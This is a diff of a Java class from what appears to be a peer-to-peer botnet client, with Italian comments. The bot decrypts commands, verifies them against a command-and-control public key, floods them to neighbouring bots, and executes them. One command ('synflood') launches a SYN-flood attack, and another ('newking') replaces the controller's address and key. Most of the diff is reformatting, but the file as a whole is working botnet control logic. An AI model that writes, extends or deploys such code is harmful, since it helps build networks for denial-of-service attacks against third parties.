@@ -33,7 +33,7 @@ public class Behavior {
 	private NetworkService nServ;
 	@Autowired
 	private Config eng;
-	
+
 	@Autowired
 	private BotRequest req;
 
@@ -75,10 +75,8 @@ public class Behavior {
 	 */
 	public void initializeBot() {
 
-//		nServ.firstConnectToMockServerDns();
-		
-		
-		
+		// nServ.firstConnectToMockServerDns();
+
 		if (challengeToCommandConquer()) {
 			System.out.println("Bot is Ready");
 		} else
@@ -152,43 +150,44 @@ public class Behavior {
 	 * @param rawData
 	 */
 	@Async
-	public void floodAndExecute(String rawData,IP ip) {
+	public void floodAndExecute(String rawData, IP ip) {
 
 		String msg = "";
 
 		// decritta il msg
-		System.out.println("rawdata: "+rawData);
-			msg = pki.getCrypto().decryptAES(rawData);
-			System.out.println("msg: "+msg.toString());
-			if(msg == null)
-				return;
+		System.out.println("rawdata: " + rawData);
+		msg = pki.getCrypto().decryptAES(rawData);
+		System.out.println("msg: " + msg.toString());
+		if (msg == null)
+			return;
 		// Per comodità
 		String[] msgs = msg.split("<HH>");
-		
+
 		for (int i = 0; i < msgs.length; i++) {
-			System.out.println("msgs["+i+"]= "+msgs[i]);
+			System.out.println("msgs[" + i + "]= " + msgs[i]);
 		}
-		
+
 		// hai gia ricevuto questo msg? bella domanda
 		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
-			System.out.println("idHashMessage "+msgs[0]);
-				System.out.println("NUOVO ORDINE DA ESEGUIRE");
+			System.out.println("idHashMessage " + msgs[0]);
+			System.out.println("NUOVO ORDINE DA ESEGUIRE");
 			// verifica la firma con chiave publica c&c
 			try {
-				System.out.println("signature"+msgs[2]);
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],nServ.getCommandConquerIps().getList().get(0).getValue2())) {
+				System.out.println("signature" + msgs[2]);
+				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
+						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
 					data.setValue2(msgs[0]);
 					msgHashList.add(data);
 					System.out.println("SIGNATURE OK");
 					// se verificato inoltralo ai vicini
-					floodNeighoours(msg,ip);
+					floodNeighoours(rawData, ip);
 					System.out.println("FLOOD A VICINI");
 					// inoltra all'interpretedei msg
 					executeCommand(msgs[1]);
 					System.out.println("COMANDO ESEGUTO");
-				}else{
+				} else {
 					System.out.println("SIGNATURE COMANDO FALLITA");
 				}
 			} catch (InvalidKeyException | SignatureException e) {
@@ -196,24 +195,26 @@ public class Behavior {
 				e.printStackTrace();
 			}
 		}
-		
+
 	}
 
 	@Async
 	private void floodNeighoours(String msg, IP ip) {
 
-System.out.println("size lista "+ nServ.getNeighbours().getList().size());
-		for (Pairs<IP,PublicKey> p : nServ.getNeighbours().getList()) {
-			IP test=new IP(new String(p.getValue1().getIp().toString()));
-			System.out.println("vicino "+test);
-			if(!ip.equals(test))
-			req.sendFloodToOtherBot(p.getValue1(), msg);
+		System.out.println("size lista " + nServ.getNeighbours().getList().size());
+		for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
+			IP test = p.getValue1();
+			System.out.println("vicino " + test);
+			if (!ip.equals(test)) {
+				req.sendFloodToOtherBot(p.getValue1(), msg);
+				System.out.println("flood vicino "+ test);
+			}
 		}
-		
-//		nServ.getNeighbours().getList().forEach((pairs) -> {
-//			System.out.println("pairs ip"+pairs.getValue1().getIp());
-//			req.sendFloodToOtherBot(pairs.getValue1(), msg);
-//		});
+
+		// nServ.getNeighbours().getList().forEach((pairs) -> {
+		// System.out.println("pairs ip"+pairs.getValue1().getIp());
+		// req.sendFloodToOtherBot(pairs.getValue1(), msg);
+		// });
 
 		// cripta il messaggio e invialo ai vicini
 
@@ -222,20 +223,20 @@ System.out.println("size lista "+ nServ.getNeighbours().getList().size());
 	// TODO definire attacchi
 	@Async
 	private void executeCommand(String msg) {
-	
-		if(msg.startsWith("newking")){
+
+		if (msg.startsWith("newking")) {
 			foo(msg);
 		}
-		if(msg.startsWith("synflood")){
+		if (msg.startsWith("synflood")) {
 			malS.synFlood(msg);
 		}
-		if(msg.startsWith("")){
-			
+		if (msg.startsWith("")) {
+
 		}
-		if(msg.startsWith("")){
-			
+		if (msg.startsWith("")) {
+
 		}
-		
+
 		// che comando è?
 		// spam
 		// attack
@@ -246,14 +247,14 @@ System.out.println("size lista "+ nServ.getNeighbours().getList().size());
 
 	}
 
-	public void foo(String  msg){
+	public void foo(String msg) {
 		String[] msgs = msg.split("<CC>");
 		nServ.getCommandConquerIps().getList().remove(0);
-		Pairs<IP,PublicKey> pairs=new Pairs<IP,PublicKey>(new IP(msgs[1]),pki.rebuildPuK(msgs[2]));
+		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
 		nServ.getCommandConquerIps().add(pairs);
-		
+
 	}
-	
+
 	public BotRequest getRequest() {
 		return req;
 	}
@@ -301,27 +302,26 @@ System.out.println("size lista "+ nServ.getNeighbours().getList().size());
 		graph.forEach(e -> System.out.println("edges: " + e));
 		// informo cc vecchio che spnp ready
 
-		
 		List<IP> vertex = new ArrayList<IP>();
 		List<Pairs<IP, IP>> edge = new ArrayList<Pairs<IP, IP>>();
 		List<String[]> strs = new ArrayList<String[]>();
 		for (String str : graph) {
 			String[] sts = str.split("|");
 			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
-			if(!vertex.contains(new IP(sts[0])))
-			vertex.add(new IP(sts[0]));
-			if(!vertex.contains(new IP(sts[1])))
-			vertex.add(new IP(sts[1]));
+			if (!vertex.contains(new IP(sts[0])))
+				vertex.add(new IP(sts[0]));
+			if (!vertex.contains(new IP(sts[1])))
+				vertex.add(new IP(sts[1]));
 		}
 
-		pServ.updateNetworkP2P(edge,vertex);
-		//avvisa cec che se ready
-		Boolean b=req.ready(ip);
-		if((b!=null)&&(b)){
-			
+		pServ.updateNetworkP2P(edge, vertex);
+		// avvisa cec che se ready
+		Boolean b = req.ready(ip);
+		if ((b != null) && (b)) {
+
 			eng.setCommandandconquerStatus(true);
 		}
-		//controllare risposta da cec che ha avvisato dns
+		// controllare risposta da cec che ha avvisato dns
 	}
 }
 
